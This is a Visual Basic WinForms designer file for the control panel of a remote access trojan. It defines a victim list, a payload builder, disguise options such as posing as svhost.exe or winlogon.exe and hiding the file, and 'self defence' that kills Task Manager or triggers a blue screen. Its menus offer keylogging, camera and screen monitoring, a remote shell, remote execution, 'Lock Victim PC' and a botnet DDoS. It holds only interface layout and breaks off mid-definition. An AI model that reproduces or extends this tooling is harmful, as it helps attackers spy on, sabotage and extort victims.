<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class RatPanel
    Inherits System.Windows.Forms.Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.ClientListManager = New System.ComponentModel.BackgroundWorker()
        Me.ClientListTimer = New System.Windows.Forms.Timer(Me.components)
        Me.Panel = New System.Windows.Forms.TabControl()
        Me.ClientsTab = New System.Windows.Forms.TabPage()
        Me.connectedClientsView = New System.Windows.Forms.DataGridView()
        Me.IP = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.CPU = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.RAM = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.PING = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.ACTIVEWINDOW = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.UPTIME = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.softwarename = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.antivirus = New System.Windows.Forms.DataGridViewTextBoxColumn()
        Me.ConfigTab = New System.Windows.Forms.TabPage()
        Me.GroupBox5 = New System.Windows.Forms.GroupBox()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.CheckBox13 = New System.Windows.Forms.CheckBox()
        Me.CheckBox5 = New System.Windows.Forms.CheckBox()
        Me.CheckBox12 = New System.Windows.Forms.CheckBox()
        Me.CheckBox10 = New System.Windows.Forms.CheckBox()
        Me.CheckBox9 = New System.Windows.Forms.CheckBox()
        Me.CheckBox7 = New System.Windows.Forms.CheckBox()
        Me.CheckBox6 = New System.Windows.Forms.CheckBox()
        Me.CheckBox11 = New System.Windows.Forms.CheckBox()
        Me.CheckBox8 = New System.Windows.Forms.CheckBox()
        Me.CheckBox4 = New System.Windows.Forms.CheckBox()
        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.ComboBox3 = New System.Windows.Forms.ComboBox()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.ComboBox2 = New System.Windows.Forms.ComboBox()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.ComboBox1 = New System.Windows.Forms.ComboBox()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.BuilderTab = New System.Windows.Forms.TabPage()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Log = New System.Windows.Forms.ListBox()
        Me.BuildButton = New System.Windows.Forms.Button()
        Me.clientListLBL = New System.Windows.Forms.Label()
        Me.PingButton = New System.Windows.Forms.Button()
        Me.optionsCMS = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ClientToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RebootToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RATShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RATRebootToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RATUninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BSODCrashToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UserBlacklistToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScreenMonitorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CameraMonitorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyBoardLogToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TaskManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteFileExecuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LaunchChatToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteShellToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.LockVictimPCToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FunToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MessageboxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CDOpenAndCloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PlayMP3InBackgroundToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ChangeSettingsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.everyoneCMS = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ComputersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RebootAllComputersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownAllComputersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownAllRATSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RebootAllRATSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallAllClientsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassBSODToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolsToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassRemoteExecuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassRemoteCMDToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassOpenURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassDDoSAttackBOTNETToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassMessageBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MassSettinsChangeToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Panel.SuspendLayout()
        Me.ClientsTab.SuspendLayout()
        CType(Me.connectedClientsView, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ConfigTab.SuspendLayout()
        Me.GroupBox5.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.BuilderTab.SuspendLayout()
        Me.optionsCMS.SuspendLayout()
        Me.everyoneCMS.SuspendLayout()
        Me.SuspendLayout()
        '
        'ClientListManager
        '
        Me.ClientListManager.WorkerSupportsCancellation = True
        '
        'ClientListTimer
        '
        Me.ClientListTimer.Interval = 5000
        '
        'Panel
        '
        Me.Panel.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Panel.Controls.Add(Me.ClientsTab)
        Me.Panel.Controls.Add(Me.ConfigTab)
        Me.Panel.Controls.Add(Me.BuilderTab)
        Me.Panel.Cursor = System.Windows.Forms.Cursors.Default
        Me.Panel.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Panel.Location = New System.Drawing.Point(0, 3)
        Me.Panel.Name = "Panel"
        Me.Panel.SelectedIndex = 0
        Me.Panel.Size = New System.Drawing.Size(821, 366)
        Me.Panel.TabIndex = 4
        '
        'ClientsTab
        '
        Me.ClientsTab.Controls.Add(Me.connectedClientsView)
        Me.ClientsTab.Location = New System.Drawing.Point(4, 24)
        Me.ClientsTab.Name = "ClientsTab"
        Me.ClientsTab.Padding = New System.Windows.Forms.Padding(3)
        Me.ClientsTab.Size = New System.Drawing.Size(813, 338)
        Me.ClientsTab.TabIndex = 0
        Me.ClientsTab.Text = "Clients"
        Me.ClientsTab.UseVisualStyleBackColor = True
        '
        'connectedClientsView
        '
        Me.connectedClientsView.AllowUserToAddRows = False
        Me.connectedClientsView.AllowUserToDeleteRows = False
        Me.connectedClientsView.AllowUserToResizeRows = False
        Me.connectedClientsView.BackgroundColor = System.Drawing.SystemColors.ButtonFace
        Me.connectedClientsView.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.connectedClientsView.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing
        Me.connectedClientsView.Columns.AddRange(New System.Windows.Forms.DataGridViewColumn() {Me.IP, Me.CPU, Me.RAM, Me.PING, Me.ACTIVEWINDOW, Me.UPTIME, Me.softwarename, Me.antivirus})
        Me.connectedClientsView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.connectedClientsView.Location = New System.Drawing.Point(3, 3)
        Me.connectedClientsView.MultiSelect = False
        Me.connectedClientsView.Name = "connectedClientsView"
        Me.connectedClientsView.ReadOnly = True
        Me.connectedClientsView.RowHeadersVisible = False
        Me.connectedClientsView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect
        Me.connectedClientsView.Size = New System.Drawing.Size(807, 332)
        Me.connectedClientsView.TabIndex = 0
        '
        'IP
        '
        Me.IP.HeaderText = "IP"
        Me.IP.Name = "IP"
        Me.IP.ReadOnly = True
        Me.IP.Width = 113
        '
        'CPU
        '
        Me.CPU.HeaderText = "CPU"
        Me.CPU.Name = "CPU"
        Me.CPU.ReadOnly = True
        Me.CPU.Width = 50
        '
        'RAM
        '
        Me.RAM.HeaderText = "RAM (%)"
        Me.RAM.Name = "RAM"
        Me.RAM.ReadOnly = True
        Me.RAM.Width = 65
        '
        'PING
        '
        Me.PING.HeaderText = "Ping"
        Me.PING.Name = "PING"
        Me.PING.ReadOnly = True
        Me.PING.Width = 50
        '
        'ACTIVEWINDOW
        '
        Me.ACTIVEWINDOW.HeaderText = "Active Window"
        Me.ACTIVEWINDOW.Name = "ACTIVEWINDOW"
        Me.ACTIVEWINDOW.ReadOnly = True
        Me.ACTIVEWINDOW.Width = 200
        '
        'UPTIME
        '
        Me.UPTIME.HeaderText = "Up-Time"
        Me.UPTIME.Name = "UPTIME"
        Me.UPTIME.ReadOnly = True
        Me.UPTIME.Width = 60
        '
        'softwarename
        '
        Me.softwarename.HeaderText = "Process Name"
        Me.softwarename.Name = "softwarename"
        Me.softwarename.ReadOnly = True
        Me.softwarename.Width = 120
        '
        'antivirus
        '
        Me.antivirus.HeaderText = "Antivirus"
        Me.antivirus.Name = "antivirus"
        Me.antivirus.ReadOnly = True
        '
        'ConfigTab
        '
        Me.ConfigTab.Controls.Add(Me.GroupBox5)
        Me.ConfigTab.Controls.Add(Me.GroupBox4)
        Me.ConfigTab.Controls.Add(Me.GroupBox3)
        Me.ConfigTab.Controls.Add(Me.GroupBox2)
        Me.ConfigTab.Controls.Add(Me.GroupBox1)
        Me.ConfigTab.Location = New System.Drawing.Point(4, 24)
        Me.ConfigTab.Name = "ConfigTab"
        Me.ConfigTab.Padding = New System.Windows.Forms.Padding(3)
        Me.ConfigTab.Size = New System.Drawing.Size(813, 338)
        Me.ConfigTab.TabIndex = 2
        Me.ConfigTab.Text = "Config"
        Me.ConfigTab.UseVisualStyleBackColor = True
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.TextBox2)
        Me.GroupBox5.Location = New System.Drawing.Point(8, 87)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(203, 65)
        Me.GroupBox5.TabIndex = 10
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Backup Server"
        '
        'TextBox2
        '
        Me.TextBox2.Enabled = False
        Me.TextBox2.Location = New System.Drawing.Point(4, 28)
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(187, 21)
        Me.TextBox2.TabIndex = 7
        Me.TextBox2.Text = "http://backupserver/RAT/"
        Me.TextBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.CheckBox13)
        Me.GroupBox4.Controls.Add(Me.CheckBox5)
        Me.GroupBox4.Controls.Add(Me.CheckBox12)
        Me.GroupBox4.Controls.Add(Me.CheckBox10)
        Me.GroupBox4.Controls.Add(Me.CheckBox9)
        Me.GroupBox4.Controls.Add(Me.CheckBox7)
        Me.GroupBox4.Controls.Add(Me.CheckBox6)
        Me.GroupBox4.Controls.Add(Me.CheckBox11)
        Me.GroupBox4.Controls.Add(Me.CheckBox8)
        Me.GroupBox4.Controls.Add(Me.CheckBox4)
        Me.GroupBox4.Controls.Add(Me.CheckBox3)
        Me.GroupBox4.Controls.Add(Me.CheckBox2)
        Me.GroupBox4.Controls.Add(Me.Label4)
        Me.GroupBox4.Controls.Add(Me.Label3)
        Me.GroupBox4.Controls.Add(Me.ComboBox3)
        Me.GroupBox4.Location = New System.Drawing.Point(231, 6)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(203, 194)
        Me.GroupBox4.TabIndex = 16
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "Self Defence"
        '
        'CheckBox13
        '
        Me.CheckBox13.AutoSize = True
        Me.CheckBox13.Location = New System.Drawing.Point(6, 175)
        Me.CheckBox13.Name = "CheckBox13"
        Me.CheckBox13.Size = New System.Drawing.Size(52, 19)
        Me.CheckBox13.TabIndex = 21
        Me.CheckBox13.Text = "Cmd"
        Me.CheckBox13.UseVisualStyleBackColor = True
        '
        'CheckBox5
        '
        Me.CheckBox5.AutoSize = True
        Me.CheckBox5.Location = New System.Drawing.Point(6, 159)
        Me.CheckBox5.Name = "CheckBox5"
        Me.CheckBox5.Size = New System.Drawing.Size(52, 19)
        Me.CheckBox5.TabIndex = 20
        Me.CheckBox5.Text = "Cmd"
        Me.CheckBox5.UseVisualStyleBackColor = True
        '
        'CheckBox12
        '
        Me.CheckBox12.AutoSize = True
        Me.CheckBox12.Location = New System.Drawing.Point(80, 175)
        Me.CheckBox12.Name = "CheckBox12"
        Me.CheckBox12.Size = New System.Drawing.Size(69, 19)
        Me.CheckBox12.TabIndex = 27
        Me.CheckBox12.Text = "Regedit"
        Me.CheckBox12.UseVisualStyleBackColor = True
        '
        'CheckBox10
        '
        Me.CheckBox10.AutoSize = True
        Me.CheckBox10.Location = New System.Drawing.Point(80, 159)
        Me.CheckBox10.Name = "CheckBox10"
        Me.CheckBox10.Size = New System.Drawing.Size(93, 19)
        Me.CheckBox10.TabIndex = 25
        Me.CheckBox10.Text = "TeamSpeak"
        Me.CheckBox10.UseVisualStyleBackColor = True
        '
        'CheckBox9
        '
        Me.CheckBox9.AutoSize = True
        Me.CheckBox9.Location = New System.Drawing.Point(80, 143)
        Me.CheckBox9.Name = "CheckBox9"
        Me.CheckBox9.Size = New System.Drawing.Size(87, 19)
        Me.CheckBox9.TabIndex = 24
        Me.CheckBox9.Text = "Powershell"
        Me.CheckBox9.UseVisualStyleBackColor = True
        '
        'CheckBox7
        '
        Me.CheckBox7.AutoSize = True
        Me.CheckBox7.Location = New System.Drawing.Point(80, 127)
        Me.CheckBox7.Name = "CheckBox7"
        Me.CheckBox7.Size = New System.Drawing.Size(112, 19)
        Me.CheckBox7.TabIndex = 22
        Me.CheckBox7.Text = "Process Hacker"
        Me.CheckBox7.UseVisualStyleBackColor = True
        '
        'CheckBox6
        '
        Me.CheckBox6.AutoSize = True
        Me.CheckBox6.Location = New System.Drawing.Point(80, 111)
        Me.CheckBox6.Name = "CheckBox6"
        Me.CheckBox6.Size = New System.Drawing.Size(121, 19)
        Me.CheckBox6.TabIndex = 21
        Me.CheckBox6.Text = "Resource Hacker"
        Me.CheckBox6.UseVisualStyleBackColor = True
        '
        'CheckBox11
        '
        Me.CheckBox11.AutoSize = True
        Me.CheckBox11.Location = New System.Drawing.Point(80, 95)
        Me.CheckBox11.Name = "CheckBox11"
        Me.CheckBox11.Size = New System.Drawing.Size(76, 19)
        Me.CheckBox11.TabIndex = 26
        Me.CheckBox11.Text = "Msconfig"
        Me.CheckBox11.UseVisualStyleBackColor = True
        '
        'CheckBox8
        '
        Me.CheckBox8.AutoSize = True
        Me.CheckBox8.Location = New System.Drawing.Point(6, 143)
        Me.CheckBox8.Name = "CheckBox8"
        Me.CheckBox8.Size = New System.Drawing.Size(59, 19)
        Me.CheckBox8.TabIndex = 23
        Me.CheckBox8.Text = "Skype"
        Me.CheckBox8.UseVisualStyleBackColor = True
        '
        'CheckBox4
        '
        Me.CheckBox4.AutoSize = True
        Me.CheckBox4.Location = New System.Drawing.Point(6, 127)
        Me.CheckBox4.Name = "CheckBox4"
        Me.CheckBox4.Size = New System.Drawing.Size(70, 19)
        Me.CheckBox4.TabIndex = 19
        Me.CheckBox4.Text = "Chrome"
        Me.CheckBox4.UseVisualStyleBackColor = True
        '
        'CheckBox3
        '
        Me.CheckBox3.AutoSize = True
        Me.CheckBox3.Location = New System.Drawing.Point(6, 111)
        Me.CheckBox3.Name = "CheckBox3"
        Me.CheckBox3.Size = New System.Drawing.Size(62, 19)
        Me.CheckBox3.TabIndex = 18
        Me.CheckBox3.Text = "Steam"
        Me.CheckBox3.UseVisualStyleBackColor = True
        '
        'CheckBox2
        '
        Me.CheckBox2.AutoSize = True
        Me.CheckBox2.Location = New System.Drawing.Point(6, 95)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(68, 19)
        Me.CheckBox2.TabIndex = 17
        Me.CheckBox2.Text = "Discord"
        Me.CheckBox2.UseVisualStyleBackColor = True
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(6, 77)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(90, 15)
        Me.Label4.TabIndex = 16
        Me.Label4.Text = "Lock Softwares"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(6, 17)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(151, 15)
        Me.Label3.TabIndex = 14
        Me.Label3.Text = "When TaskManager Open"
        '
        'ComboBox3
        '
        Me.ComboBox3.FormattingEnabled = True
        Me.ComboBox3.Items.AddRange(New Object() {"Do nothing", "Close TaskManager", "Idle until Close", "Generate Fake Error & Close", "Blue Screen Of Death"})
        Me.ComboBox3.Location = New System.Drawing.Point(9, 35)
        Me.ComboBox3.Name = "ComboBox3"
        Me.ComboBox3.Size = New System.Drawing.Size(188, 23)
        Me.ComboBox3.TabIndex = 15
        Me.ComboBox3.Text = "Do nothing"
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.Label2)
        Me.GroupBox3.Controls.Add(Me.ComboBox2)
        Me.GroupBox3.Controls.Add(Me.CheckBox1)
        Me.GroupBox3.Location = New System.Drawing.Point(6, 160)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(203, 103)
        Me.GroupBox3.TabIndex = 11
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Camouflage"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(3, 43)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(110, 15)
        Me.Label2.TabIndex = 13
        Me.Label2.Text = "Change File Name"
        '
        'ComboBox2
        '
        Me.ComboBox2.FormattingEnabled = True
        Me.ComboBox2.Items.AddRange(New Object() {"None", "csrss.exe", "chrome.exe", "svhost.exe", "Discord.exe", "dwn.exe", "explorer.exe", "winlogon.exe", "Steam.exe", "Skype.exe", "javaw.exe", "sublime_text.exe", "nodepad++.exe", "notepad.exe", "cmd.exe", "lightshot.exe", "ShareX.exe"})
        Me.ComboBox2.Location = New System.Drawing.Point(6, 61)
        Me.ComboBox2.Name = "ComboBox2"
        Me.ComboBox2.Size = New System.Drawing.Size(153, 23)
        Me.ComboBox2.TabIndex = 12
        Me.ComboBox2.Text = "None"
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Location = New System.Drawing.Point(6, 20)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(160, 19)
        Me.CheckBox1.TabIndex = 0
        Me.CheckBox1.Text = "Always set file as Hidden"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.ComboBox1)
        Me.GroupBox2.Location = New System.Drawing.Point(8, 269)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(203, 53)
        Me.GroupBox2.TabIndex = 10
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Extraction Folder"
        '
        'ComboBox1
        '
        Me.ComboBox1.FormattingEnabled = True
        Me.ComboBox1.Items.AddRange(New Object() {"None", "%appdata%", "%temp%", "Windows", "System32", "ProgramFiles", "ProgramFiles86", "My Documents", "My Musics", "My Images", "RANDOM"})
        Me.ComboBox1.Location = New System.Drawing.Point(6, 20)
        Me.ComboBox1.Name = "ComboBox1"
        Me.ComboBox1.Size = New System.Drawing.Size(187, 23)
        Me.ComboBox1.TabIndex = 0
        Me.ComboBox1.Text = "None"
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.TextBox1)
        Me.GroupBox1.Controls.Add(Me.Button1)
        Me.GroupBox1.Location = New System.Drawing.Point(8, 6)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(203, 75)
        Me.GroupBox1.TabIndex = 9
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Server Files Location"
        '
        'TextBox1
        '
        Me.TextBox1.Enabled = False
        Me.TextBox1.Location = New System.Drawing.Point(6, 20)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(187, 21)
        Me.TextBox1.TabIndex = 7
        Me.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(73, 46)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(49, 23)
        Me.Button1.TabIndex = 8
        Me.Button1.Text = "EDIT"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'BuilderTab
        '
        Me.BuilderTab.Controls.Add(Me.Label1)
        Me.BuilderTab.Controls.Add(Me.Log)
        Me.BuilderTab.Controls.Add(Me.BuildButton)
        Me.BuilderTab.Location = New System.Drawing.Point(4, 24)
        Me.BuilderTab.Name = "BuilderTab"
        Me.BuilderTab.Padding = New System.Windows.Forms.Padding(3)
        Me.BuilderTab.Size = New System.Drawing.Size(813, 338)
        Me.BuilderTab.TabIndex = 1
        Me.BuilderTab.Text = "Builder"
        Me.BuilderTab.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(514, 8)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(28, 15)
        Me.Label1.TabIndex = 2
        Me.Label1.Text = "Log"
        '
        'Log
        '
        Me.Log.Font = New System.Drawing.Font("Microsoft Sans Serif", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(177, Byte))
        Me.Log.FormattingEnabled = True
        Me.Log.ItemHeight = 18
        Me.Log.Location = New System.Drawing.Point(514, 27)
        Me.Log.Name = "Log"
        Me.Log.Size = New System.Drawing.Size(194, 130)
        Me.Log.TabIndex = 1
        '
        'BuildButton
        '
        Me.BuildButton.Location = New System.Drawing.Point(514, 167)
        Me.BuildButton.Name = "BuildButton"
        Me.BuildButton.Size = New System.Drawing.Size(194, 44)
        Me.BuildButton.TabIndex = 0
        Me.BuildButton.Text = "BUILD"
        Me.BuildButton.UseVisualStyleBackColor = True
        '
        'clientListLBL
        '
        Me.clientListLBL.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.clientListLBL.AutoSize = True
        Me.clientListLBL.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.clientListLBL.Location = New System.Drawing.Point(4, 383)
        Me.clientListLBL.Name = "clientListLBL"
        Me.clientListLBL.Size = New System.Drawing.Size(75, 16)
        Me.clientListLBL.TabIndex = 4
        Me.clientListLBL.Text = "Clients : 0"
        '
        'PingButton
        '
        Me.PingButton.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.PingButton.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.PingButton.Location = New System.Drawing.Point(85, 375)
        Me.PingButton.Name = "PingButton"
        Me.PingButton.Size = New System.Drawing.Size(86, 29)
        Me.PingButton.TabIndex = 6
        Me.PingButton.Text = "Ping VPS"
        Me.PingButton.UseVisualStyleBackColor = True
        '
        'optionsCMS
        '
        Me.optionsCMS.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClientToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.ToolsToolStripMenuItem, Me.FunToolStripMenuItem, Me.ChangeSettingsToolStripMenuItem})
        Me.optionsCMS.Name = "ContextMenuStrip1"
        Me.optionsCMS.Size = New System.Drawing.Size(161, 114)
        '
        'ClientToolStripMenuItem
        '
        Me.ClientToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ShutdownToolStripMenuItem, Me.RebootToolStripMenuItem, Me.RATShutdownToolStripMenuItem, Me.RATRebootToolStripMenuItem, Me.RATUninstallToolStripMenuItem, Me.BSODCrashToolStripMenuItem, Me.UserBlacklistToolStripMenuItem})
        Me.ClientToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.Sans_titre
        Me.ClientToolStripMenuItem.Name = "ClientToolStripMenuItem"
        Me.ClientToolStripMenuItem.Size = New System.Drawing.Size(160, 22)
        Me.ClientToolStripMenuItem.Text = "System"
        '
        'ShutdownToolStripMenuItem
        '
        Me.ShutdownToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.shutdown
        Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
        Me.ShutdownToolStripMenuItem.Text = "Computer Shutdown"
        '
        'RebootToolStripMenuItem
        '
        Me.RebootToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.reboot
        Me.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem"
        Me.RebootToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
        Me.RebootToolStripMenuItem.Text = "Computer Reboot"
        '
        'RATShutdownToolStripMenuItem
        '
        Me.RATShutdownToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.ratshutdown
        Me.RATShutdownToolStripMenuItem.Name = "RATShutdownToolStripMenuItem"
        Me.RATShutdownToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
        Me.RATShutdownToolStripMenuItem.Text = "RAT Shutdown"
        '
        'RATRebootToolStripMenuItem
        '
        Me.RATRebootToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.ratreboot
        Me.RATRebootToolStripMenuItem.Name = "RATRebootToolStripMenuItem"
        Me.RATRebootToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
        Me.RATRebootToolStripMenuItem.Text = "RAT Reboot"
        '
        'RATUninstallToolStripMenuItem
        '
        Me.RATUninstallToolStripMenuItem.Image = Global.WindowsApplication1.My.Resources.Resources.ratuninstall
        Me.RATUninstallToolStripMenuItem.Name = "RATUninstallToolStripMenuItem"
        Me.RATUninstallToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
        Me.RATUninstallToolStripMenuItem.Text = "RAT Uninstall"
        '
        'BSODCrashToolStripMenuItem
        '
        Me.BSODCrashToolStripMenuItem.Name = "BSODCrashToolStripMenuItem"
        Me.BSODCrashToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
        Me.BSODCrashToolStripMenuItem.Text = "BSOD Crash"
        '
        'UserBlacklistToolStripMenuItem
        '
        Me.UserBlacklistToolStripMenuItem.Name = "UserBlacklistToolStripMenuItem"
        Me.UserBlacklistToolStripMenuItem.Size = New System.Drawing.Size(185, 22)
